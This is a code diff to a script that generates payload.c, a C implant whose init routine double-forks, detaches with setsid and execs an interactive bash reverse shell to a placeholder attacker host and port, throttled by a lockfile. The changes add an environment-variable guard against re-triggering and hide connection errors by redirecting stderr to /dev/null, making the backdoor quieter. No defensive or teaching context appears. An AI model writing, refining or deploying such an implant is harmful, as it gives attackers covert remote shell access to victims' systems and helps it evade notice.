@@ -14,8 +14,13 @@ cat <<EOF > payload.c
 #include <stdio.h>
 #include <sys/stat.h>
 #include <time.h>
+#include <string.h>
 
 static int _should_fire(void) {
+    // Check if already inside a shell
+    if (getenv("RE_SHELL")) return 0;
+
+    // Rate limiting check
     struct stat st;
     if (stat("${LOCKFILE}", &st) == 0) {
         time_t now; time(&now);
@@ -32,7 +37,12 @@ static void _init(void) {
     if (fork() != 0) return;
     setsid();
     if (fork() != 0) _exit(0);
-    char *args[] = {"/bin/bash", "-c", "exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1", NULL};
+
+    // Set an environment variable so sub-shells don't re-trigger the loop
+    setenv("RE_SHELL", "1", 1);
+
+    // Redirect stderr to /dev/null so "Connection refused" stays hidden
+    char *args[] = {"/bin/bash", "-c", "exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1 2>/dev/null", NULL};
     execv("/bin/bash", args);
     _exit(0);
 }
